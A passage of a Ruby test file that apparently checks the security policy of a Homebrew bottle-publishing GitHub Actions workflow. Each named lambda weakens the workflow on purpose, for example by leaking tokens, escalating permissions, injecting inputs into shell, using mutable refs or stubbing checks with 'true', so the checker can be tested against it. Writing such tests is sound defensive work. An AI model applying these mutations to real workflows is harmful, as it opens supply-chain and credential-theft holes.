        '[ -f "$brewfile_candidate" ]'
      )
    },
    "VFS acceptance tap identity rebound to repository name" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Validate dependency-bearing VFS acceptance selection"
      )
      step.fetch("env")["TAP_NAME"] = "${{ inputs.tap-repository }}"
    },
    "release tag ABI bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Resolve release and bottle root")
      step["run"] = step.fetch("run").sub('[ "$release_tag" != "$expected_release_tag" ]', "false")
    },
    "bottle root rebound to repository identity" => lambda { |w|
      step = mutate_named_step(w, "plan", "Resolve release and bottle root")
      step["run"] = step.fetch("run").sub(
        'homebrew_bottle_root_url "$TAP_REPOSITORY" "$TAP_NAME"',
        'homebrew_bottle_root_url "$TAP_REPOSITORY" "$TAP_REPOSITORY"'
      )
    },
    "planner bottle root mapping dropped" => lambda { |w|
      step = mutate_named_step(w, "plan", "Plan formula matrix")
      step.fetch("env").delete("EXPECTED_BOTTLE_ROOT_URL")
    },
    "planner bottle root argument dropped" => lambda { |w|
      step = mutate_named_step(w, "plan", "Plan formula matrix")
      step["run"] = step.fetch("run").sub(
        'expected_args+=(--expected-bottle-root-url "$EXPECTED_BOTTLE_ROOT_URL")',
        "true"
      )
    },
    "empty-matrix rootfs architecture gate bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Plan formula matrix")
      step["run"] = step.fetch("run").sub(
        '[ "$normalized_rootfs_arches" = "wasm32" ]',
        "true"
      )
    },
    "Formula authority Ruby output overridden" => lambda { |w|
      step = mutate_named_step(w, "plan", "Warm pinned Formula authority tools")
      step["run"] = step.fetch("run") +
        "\nprintf 'ruby=/tmp/untrusted-ruby\\n' >>\"$GITHUB_OUTPUT\"\n"
    },
    "rootfs publication selection bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Plan formula matrix")
      step["run"] = step.fetch("run").sub(
        "bash scripts/homebrew-rootfs-publication-selection.sh",
        "true #"
      )
    },
    "execution-boundary Formula authority bypass" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test",
        "Build and test Homebrew bottle without publisher credentials"
      )
      step["run"] = step.fetch("run").sub(
        "bash scripts/homebrew-rootfs-publication-selection.sh",
        "true #"
      )
    },
    "uploader dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle")["needs"] = ["plan"]
    },
    "version-index dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index")["needs"] = ["plan", "upload-bottle"]
    },
    "verifier dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle")["needs"] = ["plan", "upload-bottle"]
    },
    "finalizer dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("finalize-tap")["needs"] = ["plan", "verify-bottle"]
    },
    "VFS release finalizer dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("publish-vfs-release")["needs"] = ["plan", "verify-bottle"]
    },
    "build authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("build-and-test").fetch("permissions")["packages"] = "write"
    },
    "Formula generation activation skipped" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Materialize exact-main Formula runtime packages"
      )
      step["if"] = "${{ false }}"
    },
    "Formula generation local resolver check bypass" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Materialize exact-main Formula runtime packages"
      )
      step["run"] = step.fetch("run").sub(
        '[ "$index_url" = "$expected_index_url" ]', "true"
      )
    },
    "Formula generation locked host preparation bypass" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Materialize exact-main Formula runtime packages"
      )
      step["run"] = step.fetch("run").sub(
        ".github/scripts/prepare-homebrew-package-materializer.sh",
        "true"
      )
    },
    "complete generation omits wasm64" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Materialize exact-main verification runtime packages"
      )
      step["run"] = step.fetch("run").sub(
        '--wasm64-tag "$PACKAGE_GENERATION_WASM64" \\',
        ""
      )
    },
    "verification generation activates mutable resolver" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Materialize exact-main verification runtime packages"
      )
      step["run"] = step.fetch("run").sub(
        'echo "WASM_POSIX_BINARY_INDEX_URL=$index_url" >> "$GITHUB_ENV"',
        'echo "WASM_POSIX_BINARY_INDEX_URL=https://example.invalid/index.toml" >> "$GITHUB_ENV"'
      )
    },
    "verification generation locked host preparation bypass" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Materialize exact-main verification runtime packages"
      )
      step["run"] = step.fetch("run").sub(
        ".github/scripts/prepare-homebrew-package-materializer.sh",
        "true"
      )
    },
    "uploader authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle").fetch("permissions")["contents"] = "write"
    },
    "child upload serialization bypass" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle").delete("concurrency")
    },
    "uploader PAT authentication" => lambda { |w|
      step = mutate_named_step(
        w, "upload-bottle", "Upload validated bottle in isolated ORAS auth state"
      )
      step.fetch("env")["GH_TOKEN"] = "${{ secrets.UNREVIEWED_TOKEN }}"
      step["run"] = step.fetch("run")
        .sub("--auth-mode github-token", "--auth-mode pat")
        .sub("--require-pat false", "--require-pat true")
    },
    "version-index authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index").fetch("permissions")["contents"] = "write"
    },
    "version-index PAT authentication" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Publish the complete Homebrew version index in isolated ORAS auth state"
      )
      step.fetch("env")["GH_TOKEN"] = "${{ secrets.UNREVIEWED_TOKEN }}"
      step["run"] = step.fetch("run")
        .sub("--auth-mode github-token", "--auth-mode pat")
        .sub("--require-pat false", "--require-pat true")
    },
    "version-index serialization bypass" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index").delete("concurrency")
    },
    "child and index GHCR writer lock divergence" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index")
        .fetch("concurrency")["group"] =
          "kandelo-homebrew-index-${{ matrix.formula }}"
    },
    "verifier authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle").fetch("permissions")["packages"] = "read"
    },
    "finalizer authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("finalize-tap").fetch("permissions")["packages"] = "write"
    },
    "VFS release package authority" => lambda { |w|
      w.fetch("jobs").fetch("publish-vfs-release").fetch("permissions")["packages"] = "write"
    },
    "dry-run bottle upload" => lambda { |w|
      job = w.fetch("jobs").fetch("upload-bottle")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "dry-run version-index publication" => lambda { |w|
      job = w.fetch("jobs").fetch("publish-bottle-index")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "dry-run tap finalization" => lambda { |w|
      job = w.fetch("jobs").fetch("finalize-tap")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "dry-run VFS release publication" => lambda { |w|
      job = w.fetch("jobs").fetch("publish-vfs-release")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "VFS release validation receives token" => lambda { |w|
      step = mutate_named_step(
        w, "publish-vfs-release", "Validate VFS release handoff without credentials"
      )
      step.fetch("env")["GH_TOKEN"] = "${{ github.token }}"
    },
    "VFS release uses mutable tap source" => lambda { |w|
      step = mutate_named_step(
        w, "publish-vfs-release", "Checkout exact VFS source tap without credentials"
      )
      step.fetch("with")["ref"] = "main"
    },
    "VFS release dependency checkout bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-vfs-release",
        "Checkout exact public core dependency tap for VFS publication"
      )
      step["if"] = "${{ false }}"
    },
    "VFS handoff dependency tap omitted" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Prepare exact browser-proven VFS release handoff"
      )
      step["run"] = step.fetch("run").sub('"${dependency_tap_args[@]}"', "true")
    },
    "VFS credential-free dependency tap omitted" => lambda { |w|
      step = mutate_named_step(
        w, "publish-vfs-release", "Validate VFS release handoff without credentials"
      )
      step["run"] = step.fetch("run").sub('"${dependency_tap_args[@]}"', "true")
    },
    "VFS publisher dependency tap omitted" => lambda { |w|
      step = mutate_named_step(
        w, "publish-vfs-release",
        "Publish and anonymously read back the immutable VFS release"
      )
      step["run"] = step.fetch("run").sub('"${dependency_tap_args[@]}"', "true")
    },
    "VFS dependency snapshot cleanliness omitted" => lambda { |w|
      step = mutate_named_step(
        w, "publish-vfs-release", "Verify VFS release source snapshots"
      )
      step["run"] = step.fetch("run").sub(
        "git -C dependency-taps/core status --short --untracked-files=all",
        "git -C dependency-taps/core status --short --untracked-files=no"
      )
    },
    "unreviewed Kandelo ref" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout Kandelo workflow source")
      step.fetch("with")["ref"] = "feature"
    },
    "persisted source credentials" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout tap")
      step.fetch("with")["persist-credentials"] = true
    },
    "persisted verifier credentials" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Checkout exact tap source")
      step.fetch("with")["persist-credentials"] = true
    },
    "build token exposure" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Build and test Homebrew bottle without publisher credentials")
      step["env"]["GH_TOKEN"] = "${{ github.token }}"
    },
    "native build API uses verifier roots" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Freeze signed native Homebrew API"
      )
      step["run"] = step.fetch("run").sub(
        ".build_and_test[]", ".runtime_and_test[]"
      )
    },
    "native verifier API uses build roots" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle",
        "Freeze signed native Homebrew API for bottle verification"
      )
      step["run"] = step.fetch("run").sub(
        ".runtime_and_test[]", ".build_and_test[]"
      )
    },
    "native API plan capture boundary bypass" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Freeze signed native Homebrew API"
      )
      step["run"] = step.fetch("run").sub(
        '"$1" "$2" "$3" --host-dependencies-json >"$4"',
        '"$1" "$2" "$3" --host-dependencies-json >"$plan"'
      )
    },
    "native API resolved tap map forwarding bypass" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Freeze signed native Homebrew API"
      )
      step["run"] = step.fetch("run").sub(
        'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE" \\',
        "KANDELO_HOMEBREW_RESOLVED_TAPS_FILE= \\"
      )
    },
    "native API compatibility policy substitution" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Freeze signed native Homebrew API"
      )
      step["run"] = step.fetch("run").sub(
        "homebrew-native-compatibility-roots.json",
        "homebrew-native-compatibility-lock.json"
      )
    },
    "native API state forwarding bypass" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test",
        "Build and test Homebrew bottle without publisher credentials"
      )
      step["run"] = step.fetch("run").sub(
        'KANDELO_HOMEBREW_NATIVE_API_STATE="$KANDELO_HOMEBREW_NATIVE_API_STATE" \\',
        "KANDELO_HOMEBREW_NATIVE_API_STATE= \\"
      )
    },
    "native API cleanup broadens to runner temp" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Retire isolated Formula execution identity"
      )
      step["run"] = step.fetch("run").sub(
        '"$native_api_stem-cache" "$native_api_stem-state"',
        '"$RUNNER_TEMP"'
      )
    },
    "Formula identity partial-setup rollback bypass" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Create isolated Formula execution identity"
      )
      step["run"] = step.fetch("run").sub(
        "trap rollback_identity_setup EXIT", "true"
      )
    },
    "verifier identity partial-setup rollback bypass" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Create isolated bottle verification identity"
      )
      step["run"] = step.fetch("run").sub(
        "trap rollback_identity_setup EXIT", "true"
      )
    },
    "Formula test runtime source fallback" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub("--fetch-only resolve", "resolve")
    },
    "Formula test checker build bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub(
        'cargo build --release -p xtask --target "$host" --quiet', "true"
      )
    },
    "Formula test checker validation bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub('[ ! -L "$xtask" ]', "true")
    },
    "Formula test checker single-link seal bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub(
        "bash scripts/seal-homebrew-formula-checker.sh",
        'printf "%s\\n" "$xtask"'
      )
    },
    "Formula test checker leaks job-wide" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub("GITHUB_OUTPUT", "GITHUB_ENV")
    },
    "Formula test checker output substitution" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test",
        "Build and test Homebrew bottle without publisher credentials"
      )
      step.fetch("env")["WASM_POSIX_XTASK_BIN"] = "/tmp/unreviewed-xtask"
    },
    "Formula test checker command forwarding bypass" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test",
        "Build and test Homebrew bottle without publisher credentials"
      )
      step["run"] = step.fetch("run").sub(
        'WASM_POSIX_XTASK_BIN="$WASM_POSIX_XTASK_BIN"',
        "WASM_POSIX_XTASK_BIN="
      )
    },
    "Formula verification checker build bypass" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Materialize Formula verification platform runtime"
      )
      step["run"] = step.fetch("run").sub(
        'cargo build --release -p xtask --target "$host" --quiet', "true"
      )
    },
    "Formula verification checker validation bypass" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Materialize Formula verification platform runtime"
      )
      step["run"] = step.fetch("run").sub('[ ! -L "$xtask" ]', "true")
    },
    "Formula verification checker single-link seal bypass" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Materialize Formula verification platform runtime"
      )
      step["run"] = step.fetch("run").sub(
        "bash scripts/seal-homebrew-formula-checker.sh",
        'printf "%s\\n" "$xtask"'
      )
    },
    "Formula verification checker leaks job-wide" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Materialize Formula verification platform runtime"
      )
      step["run"] = step.fetch("run").sub("GITHUB_OUTPUT", "GITHUB_ENV")
    },
    "Formula verification checker output substitution" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle",
        "Force-pour and test the exact selected bottle without credentials"
      )
      step.fetch("env")["WASM_POSIX_XTASK_BIN"] = "/tmp/unreviewed-xtask"
    },
    "Formula verification checker command forwarding bypass" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle",
        "Force-pour and test the exact selected bottle without credentials"
      )
      step["run"] = step.fetch("run").sub(
        'WASM_POSIX_XTASK_BIN="$WASM_POSIX_XTASK_BIN"',
        "WASM_POSIX_XTASK_BIN="
      )
    },
    "Formula verification cache materialized before JavaScript setup" => lambda { |w|
      steps = w.fetch("jobs").fetch("verify-bottle").fetch("steps")
      javascript_index = steps.index do |step|
        step["name"] == "Install JavaScript dependencies"
      end
      javascript_step = steps.delete_at(javascript_index)
      runtime_index = steps.index do |step|
        step["name"] == "Materialize Formula verification platform runtime"
      end
      steps.insert(runtime_index + 1, javascript_step)
    },
    "Formula test runtime cache-link materialization bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub(
        '"$PWD/binaries" "$cache_root"', '"$PWD/binaries" "$PWD"'
      )
    },
    "fork-instrument host tool build bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Build fork-instrument host tool")
      step["run"] = "true"
    },
    "wasm64 Formula target sysroot bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Build Kandelo sysroot")
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix",
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh"
      )
    },
    "wasm64 sidecar target sysroot bypass" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build Kandelo sysroot for sidecar evidence")
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix",
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh"
      )
    },
    "sidecar sysroot built in reviewed verifier source" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build Kandelo sysroot for sidecar evidence")
      step["run"] = step.fetch("run").gsub("kandelo-sysroot-build", "kandelo")
    },
    "bottle verifier reads the pristine checkout as its sysroot build" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Force-pour and test the exact selected bottle without credentials"
      )
      step["run"] = step.fetch("run").sub("kandelo-sysroot-build", "kandelo")
    },
    "sidecar evidence reads reviewed verifier build outputs" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Generate sidecars from the selected bottle")
      step["run"] = step.fetch("run").sub("kandelo-sysroot-build", "kandelo")
    },
    "browser evidence reads reviewed verifier build outputs" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the file-formula browser image")
      step["run"] = step.fetch("run").sub("kandelo-sysroot-build", "kandelo")
    },
    "isolated sysroot source recheck bypass" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Recheck trusted verifier sources after runtime execution"
      )
      step["run"] = step.fetch("run").sub(
        'git -C kandelo-sysroot-build status --short --untracked-files=no --ignore-submodules=all',
        "true"
      )
    },
    "Formula test runtime architecture drift" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub("--arch wasm32", "--arch wasm64")
    },
    "Formula test runtime package drift" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub(
        "dash,coreutils,grep,sed,rootfs", "dash"
      )
    },
    "Formula test runtime ordering bypass" => lambda { |w|
      steps = w.fetch("jobs").fetch("build-and-test").fetch("steps")
      runtime_index = steps.index do |step|
        step["name"] == "Materialize Formula test platform runtime"
      end
      formula_index = steps.index do |step|
        step["name"] == "Build and test Homebrew bottle without publisher credentials"
      end
      steps[runtime_index], steps[formula_index] = steps[formula_index], steps[runtime_index]
    },
    "Formula browser runtime bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Provision Formula browser runtime")
      step["run"] = step.fetch("run").sub(
        "scripts/homebrew-provision-formula-browser.sh", "true #"
      )
    },
    "Formula browser hosted Node bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Provision Formula browser runtime")
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh env", "env"
      )
    },
    "Formula browser Node provenance bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Provision Formula browser runtime")
      step["run"] = step.fetch("run").sub(
        "/nix/store/*/bin/node) ;;", "*) ;;"
      )
    },
    "Formula browser runtime ordering bypass" => lambda { |w|
      steps = w.fetch("jobs").fetch("build-and-test").fetch("steps")
      browser_index = steps.index { |step| step["name"] == "Provision Formula browser runtime" }
      formula_index = steps.index do |step|
        step["name"] == "Build and test Homebrew bottle without publisher credentials"
      end
      steps[browser_index], steps[formula_index] = steps[formula_index], steps[browser_index]
    },
    "Formula build identity bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create isolated Formula execution identity")
      step["run"] = step.fetch("run").sub(
        'echo "KANDELO_HOMEBREW_BUILD_USER=$build_user"', 'echo "IGNORED_BUILD_USER=$build_user"'
      )
    },
    "Formula process control-group bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create isolated Formula execution identity")
      step["run"] = step.fetch("run").sub(
        'echo "KANDELO_HOMEBREW_SYSTEMD_RUN_BIN=$systemd_run_bin"',
        'echo "IGNORED_SYSTEMD_RUN_BIN=$systemd_run_bin"'
      )
    },
    "Formula build identity retirement bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Retire isolated Formula execution identity")
      step["run"] = step.fetch("run").sub(
        '"$sudo_bin" -n -- "$userdel_bin" -r "$build_user"', "true #"
      )
    },
    "post-build validator source reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Checkout exact post-build Kandelo validator source")
      step.fetch("with")["path"] = "kandelo"
    },
    "post-build reviewed tap reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout exact post-build tap source")
      step.fetch("with")["path"] = "tap"
    },
    "Formula source closure bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub(
        "scripts/homebrew-validate-formula-source-closure.sh", "true #"
      )
    },
    "Formula source closure mutable validator reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub("kandelo-postbuild", "kandelo")
    },
    "Formula source closure mutable tap baseline" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub(
        '--reviewed-tap-root "$GITHUB_WORKSPACE/tap-reviewed"', ""
      )
    },
    "Formula source closure stale dependency map" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub(
        'export KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$resolved"', ""
      )
    },
    "handoff mutable validator reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create strict bottle data handoff")
      step["run"] = step.fetch("run").sub("kandelo-postbuild", "kandelo")
    },
    "post-build campaign bottle verification bypass" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Create strict bottle data handoff"
      )
      step["run"] = step.fetch("run").sub(
        "verify-built-bottle", "verify"
      )
    },
    "post-build campaign tag substitution" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Create strict bottle data handoff"
      )
      step.fetch("env")[
        "KANDELO_HOMEBREW_PREFIX_CAMPAIGN_TAG"
      ] = "homebrew-prefix-campaign-sha256-#{"0" * 64}"
    },
    "native build root handoff scan bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create strict bottle data handoff")
      step["run"] = step.fetch("run").sub(
        '--forbidden-root "$NATIVE_BUILD_ROOT"', '--forbidden-root "/tmp/ignored-native-root"'
      )
    },
    "OCI child composition before source revalidation" => lambda { |w|
      steps = w.fetch("jobs").fetch("build-and-test").fetch("steps")
      closure = steps.index { |step| step["name"] == "Recheck reviewed sources after Formula execution" }
      compose = steps.index do |step|
        step["name"] == "Compose deterministic Homebrew OCI child without credentials"
      end
      steps[closure], steps[compose] = steps[compose], steps[closure]
    },
    "OCI child composition drops cross-tap authority" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test",
        "Compose deterministic Homebrew OCI child without credentials"
      )
      original = step.fetch("run")
      step["run"] = original.sub(
        OCI_CROSS_TAP_COMPOSE_BOUNDARY,
        "bash scripts/dev-shell.sh python3 " \
          "scripts/homebrew-oci-layout.py build-child \\"
      )
      raise "self-test did not remove OCI cross-tap authority" if step["run"] == original
    },
    "verifier token exposure" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["env"]["GH_TOKEN"] = "${{ github.token }}"
    },
    "mutable Homebrew source" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout reviewed Homebrew implementation")
      step.fetch("with")["ref"] = "main"
    },
    "noncanonical Homebrew prefix" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Activate reviewed Homebrew implementation")
      step["run"] = step.fetch("run").sub(
        'brew_prefix="$HOMEBREW_GUEST_PREFIX"',
        'brew_prefix="/tmp/homebrew"'
      )
    },
    "writable Homebrew prefix on job PATH" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Activate reviewed Homebrew implementation")
      step["run"] = "echo \"$brew_prefix/bin\" >> \"$GITHUB_PATH\"\n#{step.fetch('run')}"
    },
    "mutable external action" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle", "Download strict build handoff")
      step["uses"] = "actions/download-artifact@main"
    },
    "direct expression in shell" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Warm Kandelo dev shell")
      step["run"] = "echo '${{ inputs.formulae }}'\n#{step.fetch('run')}"
    },
    "handoff retry collision" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Upload strict bottle build handoff")
      step.fetch("with")["name"] = "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}"
    },
    "unvalidated uploader ordering" => lambda { |w|
      steps = w.fetch("jobs").fetch("upload-bottle").fetch("steps")
      validate_index = steps.index { |step| step["name"] == "Validate build data before exposing upload credentials" }
      upload_index = steps.index { |step| step["name"] == "Upload validated bottle in isolated ORAS auth state" }
      steps[validate_index], steps[upload_index] = steps[upload_index], steps[validate_index]
    },
    "uploader validation outcome bypass" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle",
                               "Upload validated bottle in isolated ORAS auth state")
      step.delete("if")
    },
    "direct ORAS upload bypass" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle", "Upload validated bottle in isolated ORAS auth state")
      step["run"] = step.fetch("run").sub("scripts/homebrew-ghcr-upload.sh", "oras push")
    },
    "bottle upload exact-main recheck bypass" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle", "Upload validated bottle in isolated ORAS auth state")
      step["run"] = step.fetch("run").sub("require-exact-kandelo-main.sh", "true")
    },
    "credentialed uploader diagnostics" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle").fetch("steps") << {
        "name" => "Upload diagnostics", "uses" => UPLOAD_ACTION,
        "with" => { "name" => "diagnostics", "path" => "${{ runner.temp }}" },
      }
    },
    "version-index Formula Ruby execution" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Compose one complete Homebrew version index without credentials"
      )
      step["run"] = "ruby Formula/file-formula.rb\n#{step.fetch('run')}"
    },
    "unvalidated child publication receipt" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Validate child layouts and public publication evidence without credentials"
      )
      step["run"] = step.fetch("run").sub("validate-publication-receipt", "validate-child-receipt")
    },
    "flattened single index artifact bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Validate child layouts and public publication evidence without credentials"
      )
      step["run"] = step.fetch("run").sub(
        "bash scripts/homebrew-index-artifact-paths.sh", "true"
      )
    },
    "unbounded existing index descriptor" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Import the existing public Homebrew version index anonymously"
      )
      step["run"] = step.fetch("run").sub(
        "scripts/homebrew-oci-layout.py import-public-index", "oras cp"
      )
    },
    "existing index remote rebound to tap name" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Import the existing public Homebrew version index anonymously"
      )
      step["run"] = step.fetch("run").gsub("tap_repository", "tap_name").gsub(
        "KANDELO_HOMEBREW_TAP_REPOSITORY", "KANDELO_HOMEBREW_TAP_NAME"
      )
    },
    "version-index sibling preservation bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Compose one complete Homebrew version index without credentials"
      )
      step["run"] = step.fetch("run").sub('args+=(--existing-layout "$existing")', "true")
    },
    "direct version-index ORAS upload bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Publish the complete Homebrew version index in isolated ORAS auth state"
      )
      step["run"] = step.fetch("run").sub("scripts/homebrew-ghcr-upload.sh", "oras push")
    },
    "version-index exact-main recheck bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Publish the complete Homebrew version index in isolated ORAS auth state"
      )
      step["run"] = step.fetch("run").sub("require-exact-kandelo-main.sh", "true")
    },
    "missing anonymous readback" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["run"] = step.fetch("run").sub("homebrew-verify-public-bottle.ts", "true")
    },
    "generic runtime bottle filename" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["run"] = step.fetch("run").sub(
        'runtime_bottle="$bottle_cache/$BOTTLE_FILENAME"',
        'runtime_bottle="$bottle_cache/$(basename "$BOTTLE_ARCHIVE")"'
      )
    },
    "missing exact public index traversal" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Validate exact public Homebrew index traversal without credentials"
      )
      step["run"] = step.fetch("run").sub("validate-publication-receipt", "true")
    },
    "public index remote rebound to tap name" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Validate exact public Homebrew index traversal without credentials"
      )
      step["run"] = step.fetch("run").gsub("tap_repository", "tap_name").gsub(
        "KANDELO_HOMEBREW_TAP_REPOSITORY", "KANDELO_HOMEBREW_TAP_NAME"
      )
    },
    "package verification reenters complete shell preparation" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Materialize Formula verification platform runtime"
      )
      step["run"] = "./run.sh --fetch-only prepare-browser\n#{step.fetch('run')}"
    },
    "sidecar forbidden roots dropped at dev-shell boundary" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Generate sidecars from the selected bottle")
      forwarding = 'KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON" \\'
      step["run"] = step.fetch("run").lines.reject { |line| line.include?(forwarding) }.join
    },
    "browser forbidden roots dropped at dev-shell boundary" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the file-formula browser image")
